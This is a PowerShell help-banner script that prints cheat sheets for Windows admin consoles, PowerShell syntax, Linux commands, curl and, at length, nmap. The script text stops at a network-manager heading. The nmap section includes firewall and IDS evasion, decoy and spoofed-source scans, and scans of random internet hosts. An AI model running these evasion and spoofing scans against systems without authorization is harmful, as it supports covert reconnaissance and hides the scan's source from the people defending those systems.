
# BANNER
function Show-HelpBanner{
    
    Write-host ""
    Write-host -foregroundcolor red "Powershell helper commands" 
    Write-host -foregroundcolor yellow " - SHOW-COMMAND" 
    Write-host -foregroundcolor yellow " - GET-HELP (Get-HELP ABOUT_*)" 
    Write-host -foregroundcolor yellow " - GET-HELP GET-SERVICE –Detailed" 
    Write-host -foregroundcolor yellow " - GET-COMMAND"
    Write-host -foregroundcolor yellow " - GET-MODULE –ListAvailable"
    Write-host -foregroundcolor yellow " - <cmdlet> | GET-MEMBER "
    Write-host -foregroundcolor yellow " - Get-WMIClass <pattern> "
    Write-host ""
    Write-host -foregroundcolor red "Show help banner 'helpme' "
    Write-host ""
    Write-host -foregroundcolor Cyan    " - Show Windows help     = ayudawin "
    Write-host -foregroundcolor Yellow  " - Show Powershell help  = ayudaps "
    Write-host -foregroundcolor Yellow  " - Show PS Scripts Help  = psscripts "
    Write-host -foregroundcolor Green   " - Show Linux help       = ayudalinux "
    Write-host -foregroundcolor Gray " - Show Nmap help        = ayudanmap "
    Write-host -foregroundcolor DarkYellow    " - Mostrar ayuda MSF         = ayudamsf "
    Write-host -foregroundcolor DarkGray     " - Mostrar ayuda tcpdump     = ayudatcpdump"
    Write-host ""

}
Set-Alias helpme Show-HelpBanner
helpme

# Colores
# Colores
function whcyan($message){Write-host -foregroundcolor cyan "$message"}
function whgreen($message){Write-host -foregroundcolor green "$message"}
function whyellow($message){Write-host -foregroundcolor yellow "$message"}
function whgray($message){Write-host -foregroundcolor gray "$message"}
function whdarkyellow($message){Write-host -foregroundcolor darkyellow "$message"}
function whred($message){Write-host -foregroundcolor red "$message"}
function whdarkgray($message){Write-host -foregroundcolor DarkGray "$message"}

# Help menu Windows
function Win-Help
{
  Write-host ""
  whcyan " - Windows administrative tools = admin-tools "
  whcyan " - ACL and user permissions     = acl-permissions "
  whcyan " - Network utilities            = net-tools " 
  Write-host "" 
}
Set-Alias ayudawin Win-Help


# Windows Help & Commands
function Admin-Tools
{
    Write-host ""
    Write-host -foregroundcolor red "Windows administrative tools "
    Write-host ""
    whcyan " - wmimgmt.msc                 = Console Root/WMI Control "
    whcyan " - compmgmt.msc                = Administración de Equipos "
    whcyan " - devmgmt.msc                 = Administrador de Dispositivos "
    whcyan " - gpedit.msc                  = Editor de directivas locales "
    whcyan " - rsop.msc                    = Conjunto Resultante de Directivas "
    whcyan " - secpol.msc                  = Directiva de Seguridad Local "
    whcyan " - devmoderunasuserconfig.msc  = Configuración de Usuario "
    whcyan " - diskmgmt.msc                = Administración de Discos "
    whcyan " - eventvwr.msc                = Visor de eventos "
    whcyan " - fsmgmt.msc                  = Carpetas Compartidas "
    whcyan " - lusrmgr.msc                 = Usuarios y Grupos Locales "
    #
    whcyan " - azman.msc	               = Administrador de Autorizacion "
    whcyan " - certlm.msc	               = Certificados del Equipo Local "
    whcyan " - certmgr.msc                 = Certificados de Usuario "
    #
    whcyan " - comexp.msc                  = Servicios de Componentes "
    whcyan " - services.msc                = Servicios "
    whcyan " - taskschd.msc                = Programador de Tareas "
    whcyan " - perfmon.msc                 = Monitor de Rendimiento "
    whcyan " - wf.msc                      = Firewall de Windows con Seguridad Avanzada "       
    #
    whcyan " - printmanagement.msc         = Administración de Impresion "
    whcyan " - ncpa.cpl                    = Targetas de red "
    Write-host ""
    Write-host ""
    Write-host -foregroundcolor red "Herramientas administrativas de Windows - SERVIDORES"
    Write-host ""
    whcyan " - adfs.msc             = Servicios de federación de Active Directory "
    whcyan " - AdRmsAdmin.msc       = Active Directory Rights Management Services "
    whcyan " - adsiedit.msc         = Edición de ADSI "
    whcyan " - certim.msc           = Los certificados de equipo local "
    whcyan " - certsrv.msc          = Autoridad de certificacion "
    whcyan " - certtmpl.msc         = Plantillas de certificación"
    whcyan " - ciadv.msc            = Servicio de indexacion "
    whcyan " - cluadmin.msc         = Failover Cluster Manager "
    whcyan " - da6to4.msc           = Network Interfaces Performance Monitor "
    whcyan " - daihttps.msc         = Tráfico HTTPS del Monitor de rendimiento "
    whcyan " - daipsecdos.msc       = IPSec del Monitor de rendimiento "
    whcyan " - daisatapmsc          = ISATAP del Monitor de rendimiento "
    whcyan " - dfsmgmt.msc          = Administración de DFS "
    whcyan " - dhcpmgmt.msc         = Administración de DHCP "
    whcyan " - dnsmgmt.msc          = Administrador de DNS "
    whcyan " - domain.msc           = Dominios y confianzas de Active Directory "
    whcyan " - dsa.msc              = Usuarios y Computadoras de Active Directory "
    whcyan " - dssite.msc           = Sitios y servicios de Active Directory "
    whcyan " - fsrm.msc             = El Administrador de recursos del servidor de archivos        "
    whcyan " - fxsadmin.msc         = Administrador de servicios de Microsoft Fax                  "
    whcyan " - gpmc.msc             = Administración de Políticas de Grupo                         "
    whcyan " - gpme.msc             = Editor de administración de directivas de grupo              "
    whcyan " - gptedit.msc          = Editor GPO de inicio de directiva de grupo                   "
    whcyan " - hcscfg.msc           = Autoridad de registro de mantenimiento                       "
    whcyan " - idmumgmt.msc         = Gestión de Identidad de Microsoft para Unix                  "
    whcyan " - iis.msc              = Administrador de servicios de información de Internet        "
    whcyan " - iis6.msc             = Administrador de servicios de información de Internet 6.0    "
    whcyan " - lsdiag.msc           = Diagnóstico de licencias de RD		       "
    whcyan " - napclcfg.msc         = Configuración del cliente de NAP            "
    whcyan " - mfsmgmt.msc          = Servicios para Network File System          "
    whcyan " - nps.msc              = Servidor de directivas de red               "
    whcyan " - ocsp.msc             = Respondedor en línea                        "
    whcyan " - pkiview.msc          = Enterprise PKI                              "
    whcyan " - remoteprograms.msc   = Administrador de RemoteApp                  "
    whcyan " - rrasmgmt.msc         = Routing y Acceso Remoto                     "
    whcyan " - sanmmc.msc           = Administrador de almacenamiento para redes SAN                "
    whcyan " - sbmgr.msc            = Administrador de conexión a Escritorio remoto                 "
    whcyan " - scanmanagement.msc   = Administración de digitalización                              "
    whcyan " - servermanager.msc    = Administrador del servidor                                    "
    whcyan " - storagemgmt.msc      = Compartir y administrar almacenamiento                        "
    whcyan " - storexpl.msc         = Explorador de almacenamiento                                  "
    whcyan " - tapimgmt.msc         = Telefonía                                                     "
    whcyan " - tsadmin.msc          = Administrador de servicios de escritorio remoto               "
    whcyan " - tsconfig.msc         = Configuración del host de sesión de Escritorio remoto         "
    whcyan " - tsgateway.msc        = Administrador Gateway de RD                                   "
    whcyan " - tsmmc.msc            = Escritorios remotos                                           "
    whcyan " - virtmgmt.msc         = Hyper-V                                                       "
    whcyan " - wbadmin.msc          = Seguridad de Windows Server                                   "
    whcyan " - Wdsmgmt-msc          = Servicios de implementación de Windows                        "
    whcyan " - winsmgmt.msc         = WINS                                                          "
    whcyan " - wbiadmin.msc         = Seguridad de Windows Server                                   "
    whcyan " - wsrm.msc             = Administrador de recursos del Sistema de Windows              "
    whcyan " - wsus.msc             = Servicios de actualización                                    "                           
    Write-host ""
}

# RED
function Net-Tools
{
    Write-host -foregroundcolor red "Utilidades de red Windows"
    whcyan " - ipconfig /? "
    whcyan " - tracert /? "
    whcyan " - nslookup /? "
    whcyan " - arp /? "
    whcyan " - route /? "
    whcyan " - netsh /? "
    whcyan " - net /? "
    whcyan " - telnet /? "
    whcyan " - ftp /? "
    whcyan ""
}


# ACL
function Acl-Permissions
{ 
    Write-host ""
    Write-host -foregroundcolor red "Permisos y propietarios "
    Write-host ""
    whcyan " - Takeown /? = permite recuperar el acceso a un archivo denegado mediante la reasignación de la propiedad del archivo "
    whcyan " - Icacls /?  = permite asignar permisos mediante lista de control de acceso "
    Write-host ""
}

# NMAP
function Nmap-Commands
{

    Write-host ""
    Write-host -foregroundcolor red "Useful commands"
    whgray " - nmap -iR 10 -PS22-25,80,113,1050,35000 -v -sn     = Discovery only on ports x, no port scan "
    whgray " - nmap 192.168.1.1-1/24 -PR -sn -vv                 = Arp discovery only on local network, no port scan "
    whgray " - nmap -iR 10 -sn -traceroute                       = Traceroute to random targets, no port scan "
    whgray " - nmap 192.168.1.1-50 -sL --dns-server 192.168.1.1  = Query the Internal DNS for hosts, list targets only "
    whgray ""
    Write-host -foregroundcolor red "Target Specification"
    whgray " - nmap 192.168.1.1 192.168.2.1     = Scan specific IPs "
    whgray " - nmap 192.168.1.1-254             = Scan a range "
    whgray " - nmap scanme.nmap.org             = Scan a domain "
    whgray " - nmap 192.168.1.0/24              = Scan using CIDR notation "
    whgray " - nmap -iL targets.txt             = Scan targets from a file "
    whgray " - nmap -iR 100                     = Scan 100 random hosts "
    whgray " - nmap --exclude 192.168.1.1       = sExclude listed hosts "
    whgray " "
    Write-host -foregroundcolor red "Scan Techniques "
    whgray " - nmap 192.168.1.1 -sS             = TCP SYN port scan (Default) "
    whgray " - nmap 192.168.1.1 -sT             = TCP connect port scan (Default without root privilege)"
    whgray " - nmap 192.168.1.1 -sU             = UDP port scan "
    whgray " - nmap 192.168.1.1 -sA             = TCP ACK port scan "
    whgray " - nmap 192.168.1.1 -sW             = TCP Window port scan "
    whgray " - nmap 192.168.1.1 -sM             = TCP Maimon port scan "
    whgray " "
    Write-host -foregroundcolor red "Host Discovery "
    whgray " - nmap 192.168.1.1-3 -sL           = No Scan. List targets only "
    whgray " - nmap 192.168.1.1/24 -sn          = Disable port scanning. Host discovery only "
    whgray " - nmap 192.168.1.1-5 -Pn           = Disable host discovery. Port scan only "
    whgray " - nmap 192.168.1.1-5 -PS22-25,80   = TCP SYN discovery on port x.Port 80 by default "
    whgray " - nmap 192.168.1.1-5 -PA22-25,80   = TCP ACK discovery on port x.Port 80 by default "
    whgray " - nmap 192.168.1.1-5 -PU53         = UDP discovery on port x. Port 40125 by default "
    whgray " - nmap 192.168.1.1-1/24 -PR        = ARP discovery on local network "
    whgray " - nmap 192.168.1.1 -n              = Never do DNS resolution "
    whgray " "
    Write-host -foregroundcolor red "Port Specification "
    whgray " - nmap 192.168.1.1 -p 21                       = Port scan for port x "
    whgray " - nmap 192.168.1.1 -p 21-100                   = Port range "
    whgray " - nmap 192.168.1.1 -p U:53,T:21-25,80          = Port scan multiple TCP and UDP ports "
    whgray " - nmap 192.168.1.1 -p-                         = Port scan all ports "
    whgray " - nmap 192.168.1.1 -p http,https               = Port scan from service name "
    whgray " - nmap 192.168.1.1 -F                          = Fast port scan (100 ports) "
    whgray " - nmap 192.168.1.1 --top-ports 2000            = Port scan the top x ports "
    whgray " - nmap 192.168.1.1 -p-65535                    = Leaving off initial port in range makes the scan start at port 1 "
    whgray " - nmap 192.168.1.1 -p0-                        = Leaving off end port in range makes the scan go through to port 65535 "
    whgray " "
    Write-host -foregroundcolor red "Service and Version Detection "
    whgray " - nmap 192.168.1.1 -sV                         = Attempts to determine the version of the service running on port "
    whgray " - nmap 192.168.1.1 -sV --version-intensity 8   = Intensity level 0 to 9. Higher number increases possibility of correctness "
    whgray " - nmap 192.168.1.1 -sV --version-light         = Enable light mode. Lower possibility of correctness. Faster "
    whgray " - nmap 192.168.1.1 -sV --version-all           = Enable intensity level 9. Higher possibility of correctness. Slower "
    whgray " - nmap 192.168.1.1 -A                          = Enables OS detection, version detection, script scanning, and traceroute "
    whgray " "
    Write-host -foregroundcolor red "OS Detection "
    whgray " - nmap 192.168.1.1 -O                          = Remote OS detection using TCP/IP stack fingerprinting "
    whgray " - nmap 192.168.1.1 -O --osscan-limit           = If at least one open and one closed TCP port are not found it will not try OS detection against host "
    whgray " - nmap 192.168.1.1 -O --osscan-guess           = Makes Nmap guess more aggressively "
    whgray " - nmap 192.168.1.1 -O --max-os-tries 1         = Set the maximum number x of OS detection tries against a target "
    whgray " - nmap 192.168.1.1 -A                          = Enables OS detection, version detection, script scanning, and traceroute "
    whgray " "
    Write-host -foregroundcolor red "Timing and Performance "
    whgray " - nmap 192.168.1.1 -T0     = Paranoid (0) Intrusion Detection System evasion "
    whgray " - nmap 192.168.1.1 -T1     = Sneaky (1) Intrusion Detection System evasion "
    whgray " - nmap 192.168.1.1 -T2     = Polite (2) slows down the scan to use less bandwidth and use less target machine resources "
    whgray " - nmap 192.168.1.1 -T3     = Normal (3) which is default speed "
    whgray " - nmap 192.168.1.1 -T4     = Aggressive (4) speeds scans; assumes you are on a reasonably fast and reliable network "
    whgray " - nmap 192.168.1.1 -T5     = Insane (5) speeds scan; assumes you are on an extraordinarily fast network "
    whgray " "
    whgray " --host-timeout <time> 1s;4m;2h                                          = Give up on target after this long "
    whgray " --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout <time> 1s;4m;2h   = Specifies probe round trip time "
    whgray " --min-hostgroup/max-hostgroup <size<size> 50;1024                       = Parallel host scan group sizes "
    whgray " --min-parallelism/max-parallelism <numprobes> 10;1                      = Probe parallelization "
    whgray " --scan-delay/--max-scan-delay <time> 20ms;2s;4m;5h                      = Adjust delay between probes "
    whgray " --max-retries <tries> 3                                                 = Specify the maximum number of port scan probe retransmissions "
    whgray " --min-rate <number> 100                                                 = Send packets no slower than <numberr> per second "
    whgray " --max-rate <number> 100                                                 = Send packets no faster than <number> per second "
    whgray " "
    Write-host -foregroundcolor red "NSE Scripts "
    whgray " - nmap 192.168.1.1 -sC                       = Scan with default NSE scripts. Considered useful for discovery and safe "
    whgray " - nmap 192.168.1.1 --script default          = Scan with default NSE scripts. Considered useful for discovery and safe "
    whgray " - nmap 192.168.1.1 --script=banner           = Scan with a single script. Example banner "
    whgray " - nmap 192.168.1.1 --script=http*            = Scan with a wildcard. Example http "
    whgray " - nmap 192.168.1.1 --script=http,banner      = Scan with two scripts. Example http and banner "
    whgray ' - nmap 192.168.1.1 --script "not intrusive"  = Scan default, but remove intrusive scripts '
    whgray " - nmap --script snmp-sysdescr --script-args snmpcommunity=admin 192.168.1.1  = NSE script with arguments " 
    whgray " "
    Write-host -foregroundcolor red "Firewall / IDS Evasion and Spoofing "
    whgray " - nmap 192.168.1.1 -f                                                         = Requested scan (including ping scans) use tiny fragmented IP packets. Harder for packet filters "
    whgray " - nmap 192.168.1.1 --mtu 32                                                   = Set your own offset size "
    whgray " - nmap -D 192.168.1.101,192.168.1.102,192.168.1.103,192.168.1.23 192.168.1.1  = Send scans from spoofed IPs "
    whgray " - nmap -D decoy-ip1,decoy-ip2,your-own-ip,decoy-ip3,decoy-ip4 remote-host-ip  = Above example explained "
    whgray " - nmap -S www.microsoft.com www.facebook.com                                  = Scan Facebook from Microsoft (-e eth0 -Pn may be required) "
    whgray " - nmap -g 53 192.168.1.1                                                      = Use given source port number "
    whgray " - nmap --proxies http://192.168.1.1:8080, http://192.168.1.2:8080 192.168.1.1 = Relay connections through HTTP/SOCKS4 proxies "
    whgray " - nmap --data-length 200 192.168.1.1                                          = Appends random data to sent packets "
    Write-host -foregroundcolor red "Example"
    whgray " - nmap -f -t 0 -n -Pn –data-length 200 -D 192.168.1.101,192.168.1.102,192.168.1.103,192.168.1.23 192.168.1.1 "
    Write-host ""
    Write-host -foregroundcolor red "Output "
    whgray " - nmap 192.168.1.1 -oN normal.file                = Normal output to the file normal.file "
    whgray " - nmap 192.168.1.1 -oX xml.file                   = XML output to the file xml.file "
    whgray " - nmap 192.168.1.1 -oG grep.file                  = Grepable output to the file grep.file "
    whgray " - nmap 192.168.1.1 -oA results                    = Output in the three major formats at once "
    whgray " - nmap 192.168.1.1 -oG -                          = Grepable output to screen. -oN -, -oX - also usable "
    whgray " - nmap 192.168.1.1 -oN file.file --append-output  = Append a scan to a previous scan file "
    whgray " - nmap 192.168.1.1 -v                             = Increase the verbosity level (use -vv or more for greater effect) "
    whgray " - nmap 192.168.1.1 -d                             = Increase debugging level (use -dd or more for greater effect) "
    whgray " - nmap 192.168.1.1 --reason                       = Display the reason a port is in a particular state, same output as -vv "
    whgray " - nmap 192.168.1.1 --open                         = Only show open (or possibly open) ports "
    whgray " - nmap 192.168.1.1 -T4 --packet-trace             = Show all packets sent and received "
    whgray " - nmap --iflist                                   = Shows the host interfaces and routes "
    whgray " - nmap --resume results.file                      = Resume a scan "
    Write-host -foregroundcolor red "Examples "
    whgray " - nmap -p80 -sV -oG - --open 192.168.1.1/24 | grep open "
    whgray ' - nmap -iR 10 -n -oX out.xml | grep "Nmap" | cut -d " " -f5 > live-hosts.txt '
    whgray ' - nmap -iR 10 -n -oX out2.xml | grep "Nmap" | cut -d " " -f5 >> live-hosts.txt'
    whgray ' - ndiff scanl.xml scan2.xml '
    whgray ' - xsltproc nmap.xml -o nmap.html'
    whgray " - grep  'open' results.nmap | sed -r 's/ +/ /g' | sort | uniq -c | sort -rn | less "
    whgray ' - ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.198 | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//) \ '
    whgray ' nmap -sC -sV -p$ports 10.10.10.198  '
    whgray


}
Set-Alias ayudanmap Nmap-Commands

# POWERSHELL
function Powershell-Help
{
   Write-host ""
   Write-host -foregroundcolor red "KEYBOARD SHORTCUTS  "
   whyellow " - Esc             = Clear line  "
   whyellow " - Tab             = Complete partially entered cmdlet/parameter "
   whyellow " - CTRL+C          = Stop processing current command "
   whyellow " - Up/Down Arrow   = Navigate command history "
   whyellow " - CTRL+S/CTRL+R   = Search forward/reverse through history "
   whyellow " - CTRL+ALT+?      = Show all keybindings "
   whyellow ""
   #
   Write-host -foregroundcolor red "FINDING CMDLETS AND HELP  "
   whyellow " - Get-Command   = List available commands. Use -Module, -Noun, -Verb. Wildcards help too "
   whyellow " - Get-Member    = List properties and methods of an object "
   whyellow " - Get-Help      = Help for a command. Use -Online to get latest "
   whyellow ""
   #
   Write-host -foregroundcolor red "USEFUL CMDLETS  "
   whyellow " - Compress-Archive, Expand-Archive                             = Zip Files "
   whyellow " - Get-Date, Set-Date, Get-TimeZone, Set-TimeZone               = Date/Time "
   whyellow " - Get-WinEvent, New-WinEvent                                   = Event Logs "
   whyellow " - Get-Counter, Export-Counter, Import-Counter                  = Performance "
   whyellow " - Get-Clipboard, Set-Clipboard                                 = Clipboard "
   whyellow " - Restart-Computer                                             = Reboot "
   whyellow " - Out-Printer, Out-Null, Out-File                              = Send Output "
   whyellow " - Read-Host                                                    = User Input "
   whyellow " - Start-Job, Stop-Job, Get-Job, Receive-Job, Remove-Job        = Use Jobs "
   whyellow " - Start-Sleep                                                  = Wait "
   whyellow " - Get-PSDrive, New-PSDrive, Remove-PSDrive                     = Map Drives "
   whyellow " - Get-Location, Set-Location, Test-Path                        = Navigate "
   whyellow " - New-Item, Get-Item, Get-ChildItem,Get-Content,               = File/Folders "   
   whyellow " - Set-Content, Move-Item, Rename-Item, Copy-Item, Remove-Item  = File/Folders "
   whyellow " - Resolve-Path, Split-Path                                     = File/Folders "
   whyellow " - Out-Gridview                                                 = Display in GUI form (with -OutputMode and -Passthru) to select one or more items and return to shell "
   whyellow ""
   #
   Write-host -foregroundcolor red "COMMON PARAMETERS  "
   whyellow " -WHATIF         = Don’t make the changes, but output what would"
   whyellow " -CONFIRM        = Prompt before making changes "
   whyellow " -VERBOSE        = Display verbose output "
   whyellow " -DEBUG          = Display debug-level output "
   whyellow ' -ERRORACTION    = Override $ErrorActionPreference variable '
   whyellow " -OUTVARIABLE    = Redirect output to a variable"
   whyellow " -?              = Display help for the cmdlet"
   whyellow ""
   #
   Write-host -foregroundcolor red "ENVIRONMET VARIABLES"
   whyellow ' $env:AZURE_RESOURCE_GROUP = 'MyTestResourceGroup' '
   #
   Write-host -foregroundcolor red "WORKING WITH OBJECTS  "
   whyellow " Common pattern: Get | Filter/Group/Sort | Modify/Delete/Output/Convert "
   whyellow " - Where-Object     = Filters objects based on value of property "
   whyellow " - Select-Object    = Choose properties of an object to include in pipeline "
   whyellow " - Group-Object     = Group based on property values "
   whyellow " - Sort-Object      = Sort results by property values "
   whyellow " - Foreach-Object   = Act on each object in pipeline (-Parallel Act on each object in pipeline at the same time)"
   whyellow " - Measure-Object   = Measure property values or number of objects "
   whyellow ""
   #
   Write-host -foregroundcolor red "BUILT-IN VARIABLES  "
   whyellow ' - $Args                      = Arguments passed into script '
   whyellow ' - $error                     = Array of errors. $Error[0] is latest '
   whyellow ' - $host                      = Details on application running PS '
   whyellow ' - $IsLinux                   = Returns TRUE on Linux OS '
   whyellow ' - $isMacos                   = Returns TRUE on Mac OS '
   whyellow ' - $IsWindows                 = Returns TRUE on Windows OS '
   whyellow ' - $Profile                   = Path to PowerShell profiles '
   whyellow ' - $PSBoundParameterValues    = List parameters and current values '
   whyellow ' - $PSCommandPath             = Full path of script being run '
   whyellow ' - $PSItem / $_               = Current object in the pipeline '
   whyellow ' - $PSScriptRoot              = Directory the script is run from '
   whyellow ' - $PSVersionTable            = Details on PowerShell version '
   whyellow ' - '
   #
   Write-host -foregroundcolor red "OPERATORS  "
   whyellow " Pipeline |, ?? (If error), && (If success) "
   whyellow "  +, -, *, /, %                         = Arithmetic "
   whyellow "  =, +=, -=, *=, /=, %=                 = Assignment "
   whyellow "  ??                                    = Null Coalescing "
   whyellow "  -eq, -ne, -gt, -lt, -le, -ge          = Comparison "
   whyellow "  -like, -notlike                       = Wildcard Compare "
   whyellow "  -match, -notmatch, -replace           = Regex Compare "
   whyellow "  -in, -notin, -contains, -notcontains  = Contain Comparison "
   whyellow "  -and, -or, -xor, -not, !              = Logical "
   whyellow "  -is, -isnot, -as                      = Type "
   whyellow "  (statement) ? (if true) : (if false)  = Ternary "
   whyellow "  "
   #
   Write-host -foregroundcolor red "STRINGS "
   whyellow " - Select-String                                  = Grep / Search Text  "
   whyellow ' - “one,two,three” -split “,”                     = Split into array '
   whyellow ' - one”, “two”, “three” -join “, and a “          = Join '
   whyellow ' - “http://mysite.com” -replace “http:”,”https:”  = Replace '
   whyellow ' - “Pi is {0:N2}” -f [Math]::Pi                   = # Decimal Places '
   whyellow ' - “The price is {0:C}” -f 1.23                   = Format Currency '
   whyellow ' - $a = "Im yelling"; $a.ToUpper()                = Format All Caps '              
   whyellow ' - $a = “TOO LOUD”; $a.ToLower()                  = Format All Lower '
   whyellow ' - $a = “abcghij”; $a.Insert(3,"def")             = Insert Characters '
   whyellow ""
   #
   Write-host -foregroundcolor red " LOOPS & BRANCHES "
   whyellow ' - If ($true) { <this> } else { <that> }              = If/Then/Else '
   whyellow ' - For ($a=0; $a -lt 10; $a++) { <this> }             = For '
   whyellow ' - Do { <this> } While ($evaluation)                  = Do…While'
   whyellow ' - Do { <this> } Until ($evaluation)                  = Do…Until '
   whyellow ' - While ($evaluation) { <this> }                     = While'
   whyellow ' - Foreach ($a in $b) { <this $a> }                   = Foreach'
   whyellow ' - Switch ($a) { `
   "one” { <this happens if $a is “one”> } `
   Default { <this $a is none of above>} }            =  Switch' 
   #
   Write-host -foregroundcolor red "ARRAYS "
   whyellow ' - $a = @()                    = Create Array '
   whyellow ' - $a = @(“one”)               = Single Item Array '
   whyellow ' - $a[index] (0 is first)      = Item Reference '
   whyellow ' - $a[0..4] (Returns first 5)  = Range Reference '
   whyellow ' - $a[-1]                      = Last Item Reference '
   whyellow ""
   #
   Write-host -foregroundcolor red "MODULES AND PACKAGES "
   whyellow " - Find-Module                = Search PSGallery for PowerShell modules"
   whyellow " - Find-Package               = Search PSGallery, nuget.org for software "
   whyellow " - Get-Module                 = Find modules/packages installed on system  "
   whyellow " - Get-Package                = Software installed by package management  "
   whyellow " - Other Verbs                = Install, Uninstall, Update "
   whyellow " - Register-PackageSource     = Allow package sources for installation "
   whyellow " - Install-PackageProvider    = Allow additional package providers (Gist) or specific versions "
   whyellow ""
   #
   Write-host -foregroundcolor red "ADVANCED FUNCTION PARAMETER ATTRIBUTES  "
   whyellow " - Mandatory                                = Will prompt if missing "
   whyellow " - Position                                 = Allows params in order instead of by name"
   whyellow " - ValueFromPipeline                        = Allows pipeline input to parameter "
   whyellow " - ValueFromPipelineByPropertyName          = Pipeline accepted if property name matches"
   whyellow " - HelpMessage                              = Sets param help msg "
   whyellow ' - ValidateSet(“Choice1”,”Choice2”)         = Gives choice, allows tabcomplete '
   whyellow " - ValidateScript({ evaluation script })    = Processes an evaluation script "
   whyellow " - ValidateRange([1..10])                   = Enforces param values in range "
   whyellow ""
   
}
Set-Alias ayudaps Powershell-Help

# PS Scripts
function PS-Scripts
{
    whyellow ""
    Write-host -foregroundcolor red "IP Tools "
    whyellow " - GEOLocalize   "
    whyellow " - PingRange     "
    whyellow " - PublicIP  "
    whyellow ""
    Write-host -foregroundcolor red "Remote PC "
    whyellow " - ConectRPC       "
    whyellow " - Get-LoguedUser  "
    whyellow " - Get-LastLogon   "
    whyellow " - "
    whyellow " - Create-Service  "
    whyellow ""
    Write-host -foregroundcolor red "Domain Tools "
    whyellow " - Get-GroupUserMemberOf  "
    whyellow " - Get-GroupUserName      "
    whyellow " - Add-UserGroup          "
    whyellow " - LAPS                   "
    whyellow ""


}Set-Alias psscripts PS-Scripts

#
function Linux-Commands
{

    whgreen ""
    Write-host -foregroundcolor red "SHORTCUTS "
    whgreen "  ctrl+c  = halt current command                         ctrl+w  = erases one word in current line " 
    whgreen "  ctrl+z  = stops current command                        ctrl+u  = erases whole line " 
    whgreen "  fg      = resume stopped command in foreground         ctrl+r  = reverse lookup of previus commands " 
    whgreen "  bg      = resume stopped command in backgroud          !!      = repeat last command "  
    whgreen "  ctrl+d  = log out of current session                   exit    = log uot of current session " 
    whgreen "" 
    Write-host -foregroundcolor red "FILE COMMADS "
    whgreen " - ls -al                           = list all with hidden files "
    whgreen " - ls -lHZ                          = list context file "
    whgreen " - ls -ltra                         = list data creation order"
    whgreen " - ls -lR                           = list recursive folder content "
    whgreen " - ls -d */                         = list only directories "
    whgreen " - pwd                              = show current directory "
    whgreen " - rm -i                            = remove interactive " 
    whgreen " - rm -fr                           = remove force " 
    whgreen " - cp -P                            = preserve metadata "
    whgreen " - mkdir -p a/long/directory/path   = create full path directories "  
    whgreen " - mv                               = move directory, change namedirectory " 
    whgreen " - ln -s file link                  = symbolic link " 
    whgreen " - more                             = output content " 
    whgreen " - less                             = outoput content " 
    whgreen " - head                             = output firts 10 lines " 
    whgreen " - tail -n100                       = output 100 last lines " 
    whgreen " - tail -100f                       = output 100 las line as it grows " 
    whgreen ""
    #
    Write-host -foregroundcolor red "SSH & SCP "
    whgreen " - ssh user@host          = connect user host" 
    whgreen " - ssh -p port user@host  = connet port" 
    whgreen " - ssh -D port user@host  = connet use bind port " 
    whgreen " - scp user@remotehost.edu:foobar.txt /some/local/directory                                  = Copy the file 'foobar.txt' from a remote host to the local host "
    whgreen " - scp foobar.txt user@remotehost.edu:/some/remote/directory                                 = Copy the file 'foobar.txt' from the local host to a remote host"
    whgreen " - scp -r foo user@remotehost.edu:/some/remote/directory/bar                                 = Copy the directory 'foo' from the local host to a remote host's directory 'bar'"
    whgreen " - scp user@rh1.edu:/some/remote/directory/foobar.txt \user@rh2.edu:/some/remote/directory/  = Copy the file from remote host 'rh1.edu' to remote host 'rh2.edu'"  
    whgreen " - scp -P 2264 foobar.txt user@remotehost.edu:/some/remote/directory                         = Copy the file local host to a remote host using port 2264"
    whgreen " - scp user@remotehost.edu:/some/remote/directory/\{a,b,c\} .                                = Copy multiple files from the remote host to your current local host"
    whgreen " - scp -c blowfish some_file user@remotehost.edu:~                                           = Using the Blowfish cipher has been shown to increase speed "
    whgreen " - scp -c blowfish -C local_file user@remotehost.edu:~                                       = The -C option for compression should also be used to increase speed"
    whgreen " - vim scp://user@host//path/to/somefile                                                     = Edit remote file with vim " 
    whgreen "" 
    #
    Write-host -foregroundcolor red "INSTALLATION  "
    whgreen " - ./configure " 
    whgreen " - make " 
    whgreen " - make install " 
    whred   "yum: " 
    whgreen " - yum install package -y               " 
    whgreen " - yum remove package                   "
    whgreen " - yum update package                   "
    whgreen " - yum search package                   "
    whgreen " - yum info package                     "
    whgreen " - yum list term                        "
    whgreen " - yum whatprovides 'path/filename'     "
    whred   "apt: "
    whgreen " - apt full-upgrade                     "
    whgreen " - apt update && apt upgrade -y         "
    whgreen " - apt install package                  "
    whgreen " - apt install package --only-upgrade   "
    whgreen " - apt remove remove                    "
    whgreen " - apt purge package                    "
    whgreen " - apt search term                      "
    whgreen " - apt show package                     "
    whgreen " - apt list -installed                  "
    whgreen " - apt autoremove                       "
    whred   "rpm: "
    whgreen " - rpm -qa               = show installed packages "
    whgreen " - rpm -ivh package      = install package "
    whgreen " - rpm -e package        = remove package "
    whgreen ""
    #
    Write-host -foregroundcolor red "NETWORK "
    whgreen " - whois domain   = get whois domain " 
    whgreen " - dig domain     = get DNS for domain " 
    whgreen " - dig -x host    = reverse lookup host " 
    whgreen " - wget file      = download file " 
    whgreen " - wget -c file   = continue stopped download " 
    whgreen " - wget -r url    = recursively download file "
    whred   "cURL: "
    whred   " https://ec.haxx.se/usingcurl/usingcurl-returns "
    whgreen " - curl -v http://example.com -o saved                                            = Verbose " 
    whgreen " - curl --trace-time dump http://example.com                                      = Trace time "
    whgreen " - curl -w @filename http://example.com/                                          = Output "
    whgreen " - curl -w @- http://example.com/                                                 = Output "
    whgreen ' - curl -w "Type: %{content_type}\nCode: %{response_code}\n" http://example.com   = Output '
    whgreen " - curl -o output.html http://example.com/                                        = Storing download"
    whgreen " - curl -T uploadthis http://example.com/                                         = Upload (put) "
    whgreen " - curl -T uploadthis ftp://example.com/this/directory/                           = Upload (ftp )"
    whgreen " - curl -T mail smtp://mail.example.com/ --mail-from user@example.com             = Upload (smtp) "
    whgreen ' - curl -H "Host: www.example.com" http://localhost/                              = Send header '
    whgreen " - curl --interface 192.168.0.2 https://www.example.com/                          = Net interface "
    whgreen " - curl --local-port 4000-4200 https://example.com/                               = Local port "
    whgreen " - http_proxy=http://X.X.X.X:8080/ curl -4 -s http://google.com                   = Proxy HTTP "
    whgreen ""
    
    #
    Write-host -foregroundcolor red "NETWORK MANAGER"
